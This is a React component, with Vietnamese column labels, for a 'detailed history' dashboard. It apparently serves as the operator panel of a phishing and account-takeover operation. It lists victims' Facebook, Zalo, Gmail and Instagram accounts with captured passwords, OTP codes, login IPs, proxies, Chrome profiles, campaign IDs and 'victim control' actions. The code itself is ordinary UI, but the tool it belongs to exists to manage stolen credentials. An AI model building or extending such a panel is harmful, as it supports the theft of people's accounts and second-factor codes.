/**
 * Detailed History Table Component
 * Hiển thị đầy đủ thông tin user operations như yêu cầu
 */

import React, { useState } from "react";

const DetailedHistoryTable = ({
  data,
  loading,
  error,
  filters,
  onPageChange,
}) => {
  const [selectedLog, setSelectedLog] = useState(null);

  if (loading) {
    return <div className="loading">📊 Loading detailed history...</div>;
  }

  if (error) {
    return <div className="error">❌ Error: {error}</div>;
  }

  if (!data || !data.data) {
    return <div className="no-data">📭 No history data available</div>;
  }

  const { data: logs, pagination, statistics } = data;

  const handleRowClick = (log) => {
    setSelectedLog(selectedLog?.id === log.id ? null : log);
  };

  const maskPassword = (password) => {
    if (!password || password === "N/A" || password === "AUTH_FAILED") {
      return password;
    }
    return "***MASKED***";
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case "success":
        return "✅";
      case "failed":
        return "❌";
      case "pending":
        return "⏳";
      case "warning":
        return "⚠️";
      default:
        return "❓";
    }
  };

  const getPlatformIcon = (platform) => {
    switch (platform) {
      case "facebook":
        return "📘";
      case "zalo":
        return "💬";
      case "gmail":
        return "📧";
      case "instagram":
        return "📷";
      default:
        return "🌐";
    }
  };

  return (
    <div className="detailed-history-container">
      {/* Statistics Summary */}
      <div className="detailed-stats-summary">
        <div className="stat-card">
          <h4>📊 Total Operations</h4>
          <span className="stat-value">{statistics.total}</span>
        </div>
        <div className="stat-card">
          <h4>✅ Success Rate</h4>
          <span className="stat-value">
            {((statistics.success / statistics.total) * 100).toFixed(1)}%
          </span>
        </div>
        <div className="stat-card">
          <h4>🔐 Auth Operations</h4>
          <span className="stat-value">
            {logs.filter((log) => log.action === "login").length}
          </span>
        </div>
        <div className="stat-card">
          <h4>👥 Victim Actions</h4>
          <span className="stat-value">
            {logs.filter((log) => log.victimControlAction !== "none").length}
          </span>
        </div>
      </div>

      {/* Detailed History Table */}
      <div className="detailed-table-container">
        <table className="detailed-history-table">
          <thead>
            <tr>
              <th>📅 Thời Gian</th>
              <th>🌐 Nền Tảng</th>
              <th>🔗 Tên Link</th>
              <th>👤 Tài Khoản</th>
              <th>🔑 Mật Khẩu</th>
              <th>📱 Code OTP</th>
              <th>🌍 IP Login</th>
              <th>📊 Trạng Thái</th>
              <th>🌐 Chrome</th>
              <th>🔔 Thông Báo</th>
              <th>👥 Victim Control</th>
              <th>⚡ Actions</th>
            </tr>
          </thead>
          <tbody>
            {logs.map((log) => (
              <React.Fragment key={log.id}>
                <tr
                  className={`detailed-row status-${log.status} ${selectedLog?.id === log.id ? "expanded" : ""}`}
                  onClick={() => handleRowClick(log)}
                >
                  {/* Thời Gian */}
                  <td className="timestamp-cell">
                    <div className="timestamp-main">
                      {new Date(log.timestamp).toLocaleDateString("vi-VN")}
                    </div>
                    <div className="timestamp-time">
                      {new Date(log.timestamp).toLocaleTimeString("vi-VN")}
                    </div>
                  </td>

                  {/* Nền Tảng */}
                  <td className="platform-cell">
                    <span className={`platform-badge detailed ${log.platform}`}>
                      {getPlatformIcon(log.platform)} {log.platform}
                    </span>
                  </td>

                  {/* Tên Link */}
                  <td className="link-cell">
                    <div className="link-name">{log.linkName || "N/A"}</div>
                    <div className="action-type">{log.action}</div>
                  </td>

                  {/* Tài Khoản */}
                  <td className="account-cell">
                    <div className="account-name">
                      {log.account || log.user}
                    </div>
                    <div className="account-type">
                      {log.account?.includes("@") ? "Email" : "Username"}
                    </div>
                  </td>

                  {/* Mật Khẩu */}
                  <td className="password-cell">
                    <span
                      className={`password-status ${log.password === "***MASKED***" ? "masked" : "failed"}`}
                    >
                      {maskPassword(log.password)}
                    </span>
                  </td>

                  {/* Code OTP */}
                  <td className="otp-cell">
                    <span
                      className={`otp-code ${log.otpCode !== "N/A" ? "has-otp" : "no-otp"}`}
                    >
                      {log.otpCode}
                    </span>
                  </td>

                  {/* IP Login */}
                  <td className="ip-cell">
                    <div className="ip-address">{log.loginIP}</div>
                    <div className="geo-info">
                      {log.metadata?.proxyUsed || "Direct"}
                    </div>
                  </td>

                  {/* Trạng Thái */}
                  <td className="status-cell">
                    <span className={`status-badge detailed ${log.status}`}>
                      {getStatusIcon(log.status)} {log.status}
                    </span>
                  </td>

                  {/* Chrome */}
                  <td className="chrome-cell">
                    <div className="chrome-profile">{log.chromeProfile}</div>
                    <div className="chrome-version">
                      {log.metadata?.browserVersion || "Chrome/120"}
                    </div>
                  </td>

                  {/* Thông Báo */}
                  <td className="notification-cell">
                    <div className="notification-message">
                      {log.notification || log.message}
                    </div>
                  </td>

                  {/* Victim Control */}
                  <td className="victim-control-cell">
                    <span
                      className={`victim-action ${log.victimControlAction}`}
                    >
                      {log.victimControlAction}
                    </span>
                  </td>

                  {/* Actions */}
                  <td className="actions-cell">
                    <button
                      className="action-btn details"
                      onClick={(e) => {
                        e.stopPropagation();
                        handleRowClick(log);
                      }}
                    >
                      {selectedLog?.id === log.id ? "🔼" : "🔽"}
                    </button>
                  </td>
                </tr>

                {/* Expanded Details Row */}
                {selectedLog?.id === log.id && (
                  <tr className="expanded-details">
                    <td colSpan="12">
                      <div className="details-panel">
                        <div className="details-grid">
                          <div className="detail-group">
                            <h4>🔐 Authentication Details</h4>
                            <div className="detail-item">
                              <label>Session ID:</label>
                              <span>{log.metadata?.sessionId || "N/A"}</span>
                            </div>
                            <div className="detail-item">
                              <label>Duration:</label>
                              <span>{log.metadata?.duration || 0}ms</span>
                            </div>
                            <div className="detail-item">
                              <label>User Agent:</label>
                              <span>{log.metadata?.userAgent || "N/A"}</span>
                            </div>
                          </div>

                          <div className="detail-group">
                            <h4>🎯 Target Information</h4>
                            <div className="detail-item">
                              <label>Target Profile:</label>
                              <span>
                                {log.metadata?.targetProfile || "N/A"}
                              </span>
                            </div>
                            <div className="detail-item">
                              <label>Campaign ID:</label>
                              <span>{log.metadata?.campaignId || "N/A"}</span>
                            </div>
                            <div className="detail-item">
                              <label>Category:</label>
                              <span>{log.category}</span>
                            </div>
                          </div>

                          <div className="detail-group">
                            <h4>💻 Technical Details</h4>
                            <div className="detail-item">
                              <label>Screen Resolution:</label>
                              <span>
                                {log.metadata?.screenResolution || "N/A"}
                              </span>
                            </div>
                            <div className="detail-item">
                              <label>Proxy Used:</label>
                              <span>
                                {log.metadata?.proxyUsed || "Direct Connection"}
                              </span>
                            </div>
                            <div className="detail-item">
                              <label>Browser Version:</label>
                              <span>
                                {log.metadata?.browserVersion || "N/A"}
                              </span>
                            </div>
                          </div>

                          <div className="detail-group">
                            <h4>📊 Operation Metadata</h4>
                            <div className="detail-item">
                              <label>Log ID:</label>
                              <span>{log.id}</span>
                            </div>
                            <div className="detail-item">
                              <label>Created:</label>
                              <span>
                                {new Date(log.timestamp).toLocaleString(
                                  "vi-VN"
                                )}
                              </span>
                            </div>
                            <div className="detail-item">
                              <label>Full Message:</label>
                              <span>{log.message}</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </td>
                  </tr>
                )}
              </React.Fragment>
            ))}
          </tbody>
        </table>
      </div>

      {/* Enhanced Pagination */}
      <div className="detailed-pagination">
        <div className="pagination-info">
          <div className="records-info">
            Showing {(pagination.currentPage - 1) * pagination.itemsPerPage + 1}{" "}
            to{" "}
            {Math.min(
              pagination.currentPage * pagination.itemsPerPage,
              pagination.totalItems
            )}{" "}
            of {pagination.totalItems} detailed records
          </div>
          <div className="page-size-control">
            <label>Records per page:</label>
            <select
              value={filters.limit}
              onChange={(e) => onPageChange(1, parseInt(e.target.value))}
            >
              <option value="25">25</option>
              <option value="50">50</option>
              <option value="100">100</option>
            </select>
          </div>
        </div>

        <div className="pagination-controls">
          <button
            disabled={!pagination.hasPrev}
            onClick={() => onPageChange(1)}
          >
            ⏪ First
          </button>

          <button
            disabled={!pagination.hasPrev}
            onClick={() => onPageChange(pagination.prevPage)}
          >
            ⬅️ Previous
          </button>

          <span className="page-info">
            Page {pagination.currentPage} of {pagination.totalPages}
          </span>

          <button
            disabled={!pagination.hasNext}
            onClick={() => onPageChange(pagination.nextPage)}
          >
            Next ➡️
          </button>

          <button
            disabled={!pagination.hasNext}
            onClick={() => onPageChange(pagination.totalPages)}
          >
            Last ⏩
          </button>
        </div>
      </div>
    </div>
  );
};

// Enhanced CSS Styles for detailed table
const detailedStyles = `
.detailed-history-container {
  background: white;
  border-radius: 8px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  overflow: hidden;
}

.detailed-stats-summary {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 1rem;
  padding: 1rem;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
}

.detailed-stats-summary .stat-card {
  background: rgba(255,255,255,0.1);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255,255,255,0.2);
}

.detailed-table-container {
  overflow-x: auto;
  max-height: 600px;
  border: 1px solid #dee2e6;
}

.detailed-history-table {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.9rem;
}

.detailed-history-table th {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  padding: 1rem 0.5rem;
  text-align: left;
  font-weight: 600;
  position: sticky;
  top: 0;
  z-index: 10;
  border-bottom: 2px solid #5a67d8;
}

.detailed-row {
  border-bottom: 1px solid #dee2e6;
  cursor: pointer;
  transition: all 0.2s ease;
}

.detailed-row:hover {
  background: #f8f9fa;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.detailed-row.expanded {
  background: #e3f2fd;
  box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
}

.detailed-row td {
  padding: 0.75rem 0.5rem;
  vertical-align: top;
  border-right: 1px solid #f0f0f0;
}

.timestamp-cell {
  min-width: 140px;
}

.timestamp-main {
  font-weight: 600;
  color: #495057;
}

.timestamp-time {
  font-size: 0.8rem;
  color: #6c757d;
}

.platform-cell {
  min-width: 120px;
}

.platform-badge.detailed {
  display: block;
  padding: 0.4rem 0.6rem;
  border-radius: 6px;
  font-weight: 600;
  text-align: center;
}

.link-cell {
  min-width: 180px;
}

.link-name {
  font-weight: 600;
  color: #007bff;
  margin-bottom: 0.2rem;
}

.action-type {
  font-size: 0.8rem;
  color: #6c757d;
  text-transform: uppercase;
}

.account-cell {
  min-width: 160px;
}

.account-name {
  font-weight: 500;
}

.account-type {
  font-size: 0.8rem;
  color: #6c757d;
}

.password-cell {
  min-width: 120px;
}

.password-status.masked {
  color: #28a745;
  font-family: monospace;
}

.password-status.failed {
  color: #dc3545;
  font-weight: 600;
}

.otp-cell {
  min-width: 100px;
}

.otp-code.has-otp {
  background: #fff3cd;
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  font-family: monospace;
  font-weight: 600;
}

.otp-code.no-otp {
  color: #6c757d;
  font-style: italic;
}

.ip-cell {
  min-width: 120px;
}

.ip-address {
  font-family: monospace;
  font-weight: 600;
}

.geo-info {
  font-size: 0.8rem;
  color: #6c757d;
}

.status-cell {
  min-width: 100px;
}

.status-badge.detailed {
  display: inline-block;
  padding: 0.4rem 0.6rem;
  border-radius: 20px;
  font-weight: 600;
  font-size: 0.8rem;
}

.chrome-cell {
  min-width: 120px;
}

.chrome-profile {
  font-weight: 600;
  color: #495057;
}

.chrome-version {
  font-size: 0.8rem;
  color: #6c757d;
}

.notification-cell {
  min-width: 200px;
  max-width: 250px;
}

.notification-message {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  line-height: 1.4;
}

.victim-control-cell {
  min-width: 120px;
}

.victim-action {
  padding: 0.3rem 0.6rem;
  border-radius: 12px;
  font-size: 0.8rem;
  font-weight: 600;
  text-transform: uppercase;
}

.victim-action.create { background: #d4edda; color: #155724; }
.victim-action.update { background: #fff3cd; color: #856404; }
.victim-action.delete { background: #f8d7da; color: #721c24; }
.victim-action.analyze { background: #cce5ff; color: #004085; }
.victim-action.target { background: #f0e68c; color: #8b4513; }
.victim-action.campaign { background: #e1bee7; color: #4a148c; }
.victim-action.none { background: #f8f9fa; color: #6c757d; }

.actions-cell {
  min-width: 80px;
  text-align: center;
}

.action-btn {
  background: transparent;
  border: 1px solid #007bff;
  color: #007bff;
  border-radius: 4px;
  padding: 0.3rem 0.6rem;
  cursor: pointer;
  font-size: 1rem;
  transition: all 0.2s;
}

.action-btn:hover {
  background: #007bff;
  color: white;
}

.expanded-details {
  background: #f8f9fa;
  border-top: 2px solid #007bff;
}

.details-panel {
  padding: 1.5rem;
}

.details-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 1.5rem;
}

.detail-group {
  background: white;
  padding: 1rem;
  border-radius: 6px;
  border: 1px solid #dee2e6;
}

.detail-group h4 {
  margin: 0 0 1rem 0;
  color: #495057;
  border-bottom: 1px solid #dee2e6;
  padding-bottom: 0.5rem;
}

.detail-item {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.5rem;
  padding: 0.3rem 0;
}

.detail-item label {
  font-weight: 600;
  color: #6c757d;
  min-width: 120px;
}

.detail-item span {
  font-family: monospace;
  background: #f8f9fa;
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  flex: 1;
  margin-left: 0.5rem;
}

.detailed-pagination {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 1rem;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
}

.page-size-control {
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.page-size-control select {
  background: white;
  border: 1px solid #ced4da;
  border-radius: 4px;
  padding: 0.25rem;
}

.records-info {
  font-weight: 600;
}

.pagination-controls {
  display: flex;
  gap: 0.5rem;
  align-items: center;
}

.pagination-controls button {
  background: rgba(255,255,255,0.2);
  border: 1px solid rgba(255,255,255,0.3);
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.2s;
}

.pagination-controls button:hover:not(:disabled) {
  background: rgba(255,255,255,0.3);
}

.pagination-controls button:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.page-info {
  font-weight: 600;
  padding: 0 1rem;
}

/* Responsive design */
@media (max-width: 1200px) {
  .detailed-history-table {
    font-size: 0.8rem;
  }

  .detailed-history-table th,
  .detailed-history-table td {
    padding: 0.5rem 0.3rem;
  }
}

@media (max-width: 768px) {
  .detailed-stats-summary {
    grid-template-columns: repeat(2, 1fr);
  }

  .details-grid {
    grid-template-columns: 1fr;
  }

  .detailed-pagination {
    flex-direction: column;
    gap: 1rem;
  }
}
`;

// Inject detailed styles
const detailedStyleSheet = document.createElement("style");
detailedStyleSheet.innerText = detailedStyles;
document.head.appendChild(detailedStyleSheet);

export default DetailedHistoryTable;
